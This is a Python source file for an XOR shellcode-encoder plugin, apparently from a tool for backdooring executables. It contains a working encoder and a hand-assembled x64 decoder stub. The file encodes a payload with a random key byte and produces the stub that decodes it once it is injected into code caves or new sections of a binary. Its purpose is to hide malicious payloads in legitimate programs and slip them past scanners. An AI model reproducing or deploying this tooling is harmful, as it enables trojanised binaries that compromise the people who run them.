import struct
import os
import logging
import random

logger = logging.getLogger(__name__)

class single_byte_xor:

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """sing_byte_xor"""
        self.description = """Xor single byte by byte encoder"""
        self.supported_modes = ['text_loader_single_cave', 
                                'cfg_loader_single_cave',
                                'cfg_loader_add_section',
                                'text_loader_add_section',
                                'text_loader_payload_splitting',
                                'cfg_loader_payload_splitting']
        self.encoding_byte = 0x0

    def run(self, payload, BDF):
        if BDF.TESTING:
            self.encoding_byte = 0x41
        else:
            self.encoding_byte = random.randrange(1, 128)

        logger.info(f'Encoding Byte: {self.encoding_byte}')

        return self.decoder(BDF, payload), self.encoder(payload)

    def decoder(self, BDF, payload):

        dcdr = b""
        dcdr += b"\x57"                       # push rdi
        dcdr += b"\x56"                       # push rsi
        dcdr += b"\x48\x31\xFF"               # xor rdi, rdi
        dcdr += b"\x48\x81\xC7"               # add payload len to rdi
        dcdr += struct.pack("<I", len(payload))
        dcdr += b"\xe8\x00\x00\x00\x00"      # call + 5
        dcdr += b"\x5E"                      # pop rsi
        dcdr += b"\x48\x83\xC6\x17"          # add rsi, 0x5 len to encoded payload from here
        # .loop
        dcdr += b"\x48\x83\x36"               # xor rsi, encoded byte
        dcdr += struct.pack("<B", self.encoding_byte)
        dcdr += b"\x48\xFF\xC6"              # inc rsi
        dcdr += b"\x48\xFF\xCF"              # dec rdi
        dcdr += b"\x48\x83\xFF\x00"          # cmp rdi, 0
        dcdr += b"\x75\xF0"                  # jnz loop
        dcdr += b"\x5E"                      # pop rsi
        dcdr += b"\x5F"                      # pop rdi

        return dcdr

    def encoder(self, payload):
        '''
        For each byte of a payload encode it with a payload
        '''
        shellcode = b''
        for byte in payload:
            shellcode += struct.pack("<B", byte ^ self.encoding_byte)
        
        return shellcode
